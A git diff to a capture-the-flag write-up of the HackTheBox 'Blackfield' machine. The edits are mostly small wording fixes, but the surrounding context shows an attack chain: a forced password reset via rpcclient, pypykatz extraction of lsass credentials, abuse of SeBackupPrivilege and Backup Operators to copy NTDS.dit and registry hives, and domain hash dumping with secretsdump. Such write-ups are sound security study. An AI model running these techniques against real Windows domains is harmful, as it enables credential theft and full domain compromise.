@@ -627,16 +627,6 @@ This site showed that using rpcclient with the syntax `rpcclient $> setuserinfo2
 ![](../../.gitbook/assets/1.3-rpcclient-info3.png)
 
 ```text
-The SAMPR_USER_INTERNAL4_INFORMATION structure holds all attributes of a user, along with an encrypted password.
-
- typedef struct _SAMPR_USER_INTERNAL4_INFORMATION {
-   SAMPR_USER_ALL_INFORMATION I1;
-   SAMPR_ENCRYPTED_USER_PASSWORD UserPassword;
- } SAMPR_USER_INTERNAL4_INFORMATION,
-  *PSAMPR_USER_INTERNAL4_INFORMATION;
-```
-
-```text
 ┌──(zweilos㉿kali)-[/usr/share/neo4j/conf]
 └─$ rpcclient -U BLACKFIELD/support 10.10.10.192
 Enter BLACKFIELD\support's password: 
@@ -662,7 +652,7 @@ rpcclient $> setuserinfo audit2020 23 TestPass!23
 
 ![](../../.gitbook/assets/1.3-net-password.png)
 
-I also tried doing it the 'easy' way with the one-liner at the bottom of the blog post and successfully changed it with the `net` command. I'll definitely have to remember that I can use `net` commands from Linux in the future!
+I also tried doing it the 'easy' way with the one-liner from the bottom of the blog post and successfully changed it with the `net` command. I'll definitely have to remember that I can use `net` commands from Linux in the future!
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
@@ -752,7 +742,7 @@ smb: \tools\> ls
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ pypykatz lsa minidump lsass.DMP                                                  
+└─$ pypykatz lsa minidump lsass.DMP | tee blackfieldCreds                                                 
 INFO:root:Parsing file lsass.DMP
 FILE: ======== lsass.DMP =======
 == LogonSession ==
@@ -836,9 +826,6 @@ ran mimikatz - python edition \(`pypykatz`\) on the lssas.DMP file, then pulled 
 └─$ cat blackfieldCreds | grep -i password | cut -d '"' -f4 |sort | uniq >> passwords
 
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ vim passwords 
-
-┌──(zweilos㉿kali)-[~/htb/blackfield]
 └─$ cat blackfieldCreds | grep -i nthash | cut -d '"' -f4 |sort | uniq >> hashes
 ```
 
@@ -917,7 +904,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-Imediately after logging in I knew I had a privilege escalation path. Either of `SeBackupPrivilege` or `SeRestorePrivilege` can be abused for privilege escalation, but its even easier having both!
+Immediately after logging in I knew I had a privilege escalation path. Either of `SeBackupPrivilege` or `SeRestorePrivilege` can be abused for privilege escalation, but its nicer having both!
 
 ### User.txt
 
@@ -974,7 +961,7 @@ Mode                LastWriteTime         Length Name
 Access is denied.
 ```
 
-So much for the easy way to get the flag. with the SeBackupPrivilege I should have the ability to backup any file, but it lookds like there was something limiting it. I did get a file `notes.txt`
+So much for the easy way to get the flag. with the SeBackupPrivilege I should have the ability to backup any file, but it looked like there was something limiting it. I did get a file `notes.txt`
 
 ```text
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cat notes.txt
@@ -992,27 +979,11 @@ We will probably have to backup & restore things later.
 PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
 ```
 
-So the "audit report" \(root.txt\) is encrypted. That would explain why it cannot be copied directly. I guess I have to privesc first. Searching for `SeBackupPrivilege` led me to [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege).
+So the "audit report" \(root.txt\) is encrypted. That would explain why it cannot be copied directly. I guess I have to privesc to the Administrator user first in order to decrypt it. Searching for `SeBackupPrivilege` led me to [https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea\_Pierini-Whoami\_Priv\_Show\_Me\_Your\_Privileges\_And\_I\_Will\_Lead\_You\_To\_System.pdf](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
 
-```text
-*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilege
-SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dll    
-*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilegeCmdLets.dll
-Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\Users\svc_backup\Documents\SeBackupPrivilegeCmdLets.dll                                                                                                    
+> Members of “Backup Operators” can logon locally on a Domain Controller and backup the NTDS.DIT, for ex. with: “wbadmin.exe” or “diskshadow.exe”
 
-
-Data: 16384 bytes of 16384 bytes copied
-
-Info: Upload successful!
-
-*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilegeUtils.dll
-Info: Uploading SeBackupPrivilegeUtils.dll to C:\Users\svc_backup\Documents\SeBackupPrivilegeUtils.dll
-
-
-Data: 21844 bytes of 21844 bytes copied
-
-Info: Upload successful!
-```
+will try `wbadmin.exe` to backup files and try to backup to local share rather than trying to exfil later
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
@@ -1172,7 +1143,7 @@ Info: Downloading C:\Users\svc_backup\Documents\sam.hive to sam.hive
 Info: Download successful!
 ```
 
-Next I saved each of the registry hives and downloaded all of the files. Unfortunately the SECURITY hive would not save, but I didn't really need it for getting the password hashes
+Next I saved each of the registry hives and downloaded all of the files. Unfortunately the SECURITY hive would not save, but I didn't really need it for getting the password hashes. Luckily exfiltrating files is very easy to do in an Evil-WinRM shell!
 
 ### Getting a shell
 
@@ -1196,7 +1167,7 @@ support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::
 ...snipped...
 ```
 
-Using Impacket's secretsdump.py I was able to dump the password hashes for all of the domain users \(including the 300+ Blackfield123456 users!\)
+Using Impacket's `secretsdump.py` I was able to dump the password hashes for all of the domain users \(including the 300+ Blackfield123456 users!\)
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
